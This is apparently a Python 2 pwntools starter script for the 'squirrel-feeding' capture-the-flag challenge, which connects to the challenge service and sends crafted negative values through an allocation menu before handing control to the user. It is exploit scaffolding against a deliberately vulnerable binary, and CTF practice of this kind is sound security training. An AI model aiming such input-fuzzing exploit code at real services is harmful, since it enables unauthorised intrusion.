#!/usr/bin/python2

from pwn import *

exe = ELF("challenge_patched")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("squirrel-feeding.wolvctf.io", 1337)

    return r

def alloc_squirrel(r, name, value):
    r.sendlineafter(">", "1")
    r.sendlineafter(":", name)
    r.sendlineafter(":", "{}".format(value))
    


def main():
    r = conn()

    alloc_squirrel(r, "1", '-1')
    alloc_squirrel(r, "E", '-2')
    alloc_squirrel(r, "O", '-3')
    alloc_squirrel(r, "Y", '-4')
    alloc_squirrel(r, "c", '-1197')
    # good luck pwning :)

    r.interactive()


if __name__ == "__main__":
    main()
